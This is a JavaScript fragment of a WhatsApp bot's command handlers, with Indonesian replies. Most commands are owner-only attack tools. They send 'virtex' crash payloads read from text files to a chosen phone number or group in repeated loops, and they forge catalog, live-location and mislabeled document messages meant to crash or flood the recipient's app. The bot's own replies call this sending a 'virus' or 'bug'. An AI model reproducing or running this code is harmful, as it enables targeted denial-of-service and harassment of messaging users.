case prefix+'arsallto': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 6281327496283`)
let idnya = `${args[0]}@s.whatsapp.net`
for (let iya of idnya) {
conn.sendText(iya, fs.readFileSync('./src/1.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/2.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/3.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/4.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/5.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/6.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/7.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/8.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/9.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/10.txt'), { quoted: troli })

}
reply(`Sucess Mengirim Virus Ke ${idnya}`)
}
break
case prefix+'arsall': {
if (!isOwner) return reply(mess.OnlyOwner)
let idnya = `${reply}`
for (let iya of idnya) {
conn.sendText(iya, fs.readFileSync('./src/1.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/2.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/3.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/4.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/5.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/6.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/7.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/8.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/9.txt'), { quoted: troli })

conn.sendText(iya, fs.readFileSync('./src/10.txt'), { quoted: troli })

}
reply(`Sucess`)
}
break
case prefix+'jadicatalog': {
if (!/image/.test(mime)) return reply(`Tag Gambar Nya`)
if (!q) return reply(`Text Nya Bang ?`)
let { TelegraPh } = require('./lib/uploader')
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let bufernya = await getBuffer(mem)
tod = await reSize(bufernya, 200, 200)
var messa = await prepareWAMessageMedia({ image: tod}, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `${q} ${philip}`,
"description": `${setting.ownerName} ORANG BAIK 😆`,
"footerText":  `${q} ${philip}`,
"currencyCode": "IDR",
"priceAmount1000": "78263829728292",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": setting.author,
"url": `https://wa.me/6281327496283?text=Bug+lu+ga+keras+deck+🗿`
},
"businessOwnerJid": "6281327496283@s.whatsapp.net"
}
}), { userJid: m.chat, quoted: troli })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case prefix+'jadivirtex': {
if (!q) return reply(`Contoh: ${command} Ushio`)
let quotednya = await conn.sendText(m.chat, `${q} ${philip}`)
conn.sendText(m.chat, `Virtex Nya Itu Bang`, quotednya)
}
break
case prefix+'ars1': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 6281327496282|5`)
if (!q.includes('|')) return reply(`Contoh: ${command} 6281327496282|5`)
let idnya = q.split('|')[0]+'@s.whatsapp.net'
let jumlah = q.split('|')[1]
let njy = ['1','2','3','4','5','6','7','8','9','10']
let rndm = njy[Math.floor(Math.random() * (njy.length))]
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(idnya, { text: fs.readFileSync(`./src/${rndm}.txt`)}, { quoted: troli} )
await sleep(ms(`1s`))
}
reply(`Succes Send To ${idnya} Sebanyak ${jumlah}`)
}
break
case prefix+'arsgc': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 120363026814584754@g.us|5`)
if (!q.includes('|')) return reply(`Contoh: ${command} 120363026814584754@g.us|5`)
let idnya = q.split('|')[0]
let jumlah = q.split('|')[1]
let njy = ['1','2','3','4','5','6','7','8','9','10']
let rndm = njy[Math.floor(Math.random() * (njy.length))]
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(idnya, { text: fs.readFileSync(`./src/${rndm}.txt`)}, { quoted: troli} )
await sleep(ms(`1s`))
}
reply(`Succes Send To ${idnya} Sebanyak ${jumlah}`)
}
break
case prefix+'arsv1': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

let jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { text: fs.readFileSync('./src/1.txt')}, { quoted: troli})
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break
case prefix+'arsv2': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

let jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { text: fs.readFileSync('./src/2.txt')}, { quoted: troli})
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break
case prefix+'arsv3': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

let jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { text: fs.readFileSync('./src/3.txt')}, { quoted: troli})
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break
case prefix+'arsv4': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

let jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { text: fs.readFileSync('./src/4.txt')}, { quoted: troli})
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break
case prefix+'arsv5': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

let jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { text: fs.readFileSync('./src/5.txt')}, { quoted: troli})
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break
case prefix+'slebew': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

const men = ['sound1','sound2','sound3','sound4','sound5','sound6','sound7','sound8','sound9','sound10','sound11','sound12','sound13','sound14','sound15','sound16','sound17','sound18','sound19','sound20','sound21','sound22','sound23','sound24','sound25','sound26','sound27','sound28','sound29','sound30','sound31','sound32','sound33','sound34','sound35','sound36','sound37','sound38','sound39','sound40','sound41','sound42','sound43','sound44','sound45','sound46','sound47','sound48','sound49','sound50','sound51','sound52','sound53','sound54','sound55','sound56','sound57','sound58','sound59','sound60','sound61','sound62','sound63','sound64','sound65','sound66','sound67','sound68','sound69','sound70','sound71','sound72','sound73','sound74','sound75','sound76','sound77','sound78','sound79','sound80','sound81','sound82','sound83','sound84','sound85','sound86','sound87','sound88','sound89','sound90','sound91','sound92','sound93','sound94','sound95','sound96','sound97','sound98','sound99','sound100','sound101','sound102','sound103','sound104','sound105','sound106','sound107','sound108','sound109','sound110','sound111','sound112','sound113','sound114','sound115','sound116','sound117','sound118','sound119','sound120','sound121','sound122','sound123','sound124','sound125','sound126','sound127','sound128','sound129','sound130','sound131','sound132','sound133','sound134','sound135','sound136','sound137','sound138','sound139','sound140','sound141','sound142','sound143','sound144','sound145','sound146','sound147','sound148','sound149','sound150','sound151','sound152','sound153','sound154','sound155','sound156','sound157','sound158','sound159','sound160','sound161']
const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
const jumlah = `${args[0]}`
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${rndmmenu}.mp3`)
for (let i = 0; i < jumlah; i++) {
await conn.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: troli })     
}
reply(`Succes`)
}
break
case prefix+'hayo': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

const jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, {document: fs.readFileSync(`./gambar.jpg`), mimetype: 'application/zip', fileName: fs.readFileSync(`./bahan.txt`) }, { quoted : bug })
}
reply(`Sucess`)
}
break
case prefix+'hayo2': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) throw (`Penggunaan ${command} <628xxx|jumlah|waktu>`)
var number = text.split('|')[0]+'@s.whatsapp.net'
 var jumlah = text.split('|')[1] ? text.split('|')[1] : '-'
 var waktu = text.split('|')[2] ? text.split('|')[2] : '-'
 for (let i = 0; i < jumlah; i++) {
 conn.sendMessage(number, {document: fs.readFileSync(`./gambar.jpg`), mimetype: 'application/zip', fileName: fs.readFileSync(`./bahan.txt`) }, { quoted : bug })
 await sleep(ms(waktu))
 }
 reply(`Succes send bug ke ${number} sebanyak ${jumlah} dengan waktu ${waktu}`)
}
break
case prefix+'lokas2': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) throw (`Penggunaan ${command} <628xxx|jumlah|waktu>`)
var number = text.split('|')[0] ? text.split('|')[0] : '-'
 var jumlah = text.split('|')[1] ? text.split('|')[1] : '-'
 var waktu = text.split('|')[2] ? text.split('|')[2] : '-'
 for (let i = 0; i < jumlah; i++) {
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./gambar.jpg') }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": fs.readFileSync(`./bahan.txt`),
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: troli })
conn.relayMessage(`${number}@s.whatsapp.net`, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(waktu))
 }
 reply(`Succes send bug ke ${number} sebanyak ${jumlah} dengan waktu ${waktu}`)
}
break
case prefix+'lokas': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh: ${command} 5`)

const jumlah = `${args[0]}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./gambar.jpg') }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": fs.readFileSync(`./bahan.txt`),
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: troli })
conn.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(`1s`))
}
reply(`Sucess`)
}
break